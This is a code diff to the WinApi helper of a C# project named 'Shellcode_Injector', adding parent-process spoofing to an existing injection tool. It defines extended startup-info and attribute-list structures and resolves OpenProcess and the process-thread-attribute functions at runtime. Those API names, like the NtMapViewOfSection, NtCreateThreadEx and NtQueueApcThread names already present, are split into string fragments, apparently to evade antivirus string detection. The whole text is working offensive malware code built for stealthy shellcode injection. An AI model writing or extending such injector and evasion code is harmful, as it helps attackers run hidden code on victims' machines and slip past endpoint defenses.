@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Net;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
 using System.Security.Permissions;
+using static Shellcode_Injector.WinApi;
 
 namespace Shellcode_Injector
 {
@@ -27,7 +29,8 @@ namespace Shellcode_Injector
 
         public enum proc : uint
         { 
-            sspnd = 0x00000004
+            sspnd = 0x00000004,   // CREATE_SUSPENDED
+            extinf = 0x00080000   // EXTENDED_STARTUPINFO_PRESENT
         }
         public enum ntstat : uint
         {
@@ -36,6 +39,29 @@ namespace Shellcode_Injector
         }
 
         // Struct definitions
+        // Extended STARTUP_INFORMATION
+        public struct SINEX
+        {
+            public SIN StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        // PROC_THREAD_ATTRIBUTE_LIST
+        public struct PTHATTR
+        {
+            public uint dwFlags;
+            public IntPtr lpThreadAttributeList;
+            public UIntPtr Size;
+            public IntPtr lpDummy;
+        }
+
+        // PARENT_PROCESS
+        public struct PPROC
+        {
+            public IntPtr hParentProcess;
+            public IntPtr hConsole;
+        }
+
         // STARTUP_INFORMATION
         [StructLayout(LayoutKind.Sequential)]
         public struct SIN
@@ -125,8 +151,22 @@ namespace Shellcode_Injector
             uint cflags, 
             IntPtr env,
             [MarshalAs(UnmanagedType.LPWStr)]  string cwd, 
-            ref SIN str_info, 
+            ref SINEX str_info, 
             out PIN proc_info);
+
+        //OpenProcess - dwDesiredAccess, bInheritHandle, dwProcessId
+        public delegate IntPtr OP(uint access, bool ihand, uint pid);
+
+        //InitializeProcThreadAttributeList - IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize
+        public delegate bool IPTA(IntPtr lpatt, int count, int dflag, ref IntPtr size);
+
+        //UpdateProcThreadAttribute - IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
+        //IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize
+        public delegate bool UPTA(IntPtr lpatt, uint dflag, IntPtr att, ref PPROC lval, IntPtr size, IntPtr pval, IntPtr rsize);
+
+        //DeleteProcThreadAttributeList - IntPtr lpAttributeList
+        public delegate void DPTA(IntPtr lpatt);
+
 
         //ntdll.dll delegation definitions
         //NtCreateSection - out hSection, ulong desired_access, IntPtr object_attributes,
@@ -168,6 +208,10 @@ namespace Shellcode_Injector
         public static NMVS mvSection { get; private set; }
         public static NCTE cThread { get; private set; }
         public static NQAT NAPC { get; private set; } 
+        public static IPTA InitAtt { get; private set; }
+        public static UPTA UpdateAtt { get; private set; }
+        public static DPTA DelAtt { get; private set; }
+        public static OP OpenP { get; private set; }
 
 
         //Constructor which will initialize the static methods to be used.
@@ -190,6 +234,10 @@ namespace Shellcode_Injector
             mymap.Add("nmvs", new List<string> { "N", "tMap", "Vi", "ewO", "fSe", "ct", "ion" });
             mymap.Add("ncte", new List<string> { "N", "tCr", "eat", "eTh", "read", "Ex" });
             mymap.Add("nqat", new List<string> { "N", "tQ", "ue", "ueA", "pc", "Th","read" });
+            mymap.Add("ipta", new List<string> { "In", "iti", "ali", "zeP", "roc", "Th", "read", "Att", "ribu", "teL", "ist" });
+            mymap.Add("upta", new List<string> { "Up", "date", "Pr", "ocTh", "read", "At", "trib", "ute" });
+            mymap.Add("dpta", new List<string> { "Del", "ete", "Pr", "ocT", "hread", "At", "tri", "buteL", "ist" });
+            mymap.Add("op", new List<string> { "Op", "enP", "roc", "ess" });
 
 
             //Get function pointers trough LoadLibraryA and GetProcAddress
@@ -207,6 +255,11 @@ namespace Shellcode_Injector
             IntPtr p10 = GPA(sec_lib, string.Join("", mymap["nmvs"]));
             IntPtr p11 = GPA(sec_lib, string.Join("", mymap["ncte"]));
             IntPtr p12 = GPA(sec_lib, string.Join("", mymap["nqat"]));
+            IntPtr p13 = GPA(main_lib, string.Join("", mymap["ipta"]));
+            IntPtr p14 = GPA(main_lib, string.Join("", mymap["upta"]));
+            IntPtr p15 = GPA(main_lib, string.Join("", mymap["dpta"]));
+            IntPtr p16 = GPA(main_lib, string.Join("", mymap["op"]));
+
 
             //Set the delegated functions that will be used
             Allocate = Marshal.GetDelegateForFunctionPointer<VAE>(p1);
@@ -221,6 +274,10 @@ namespace Shellcode_Injector
             mvSection = Marshal.GetDelegateForFunctionPointer<NMVS>(p10);
             cThread = Marshal.GetDelegateForFunctionPointer<NCTE>(p11);
             NAPC = Marshal.GetDelegateForFunctionPointer<NQAT>(p12);
+            InitAtt = Marshal.GetDelegateForFunctionPointer<IPTA>(p13);
+            UpdateAtt = Marshal.GetDelegateForFunctionPointer<UPTA>(p14);
+            DelAtt = Marshal.GetDelegateForFunctionPointer<DPTA>(p15);
+            OpenP = Marshal.GetDelegateForFunctionPointer<OP>(p16);
         }
     }
 }
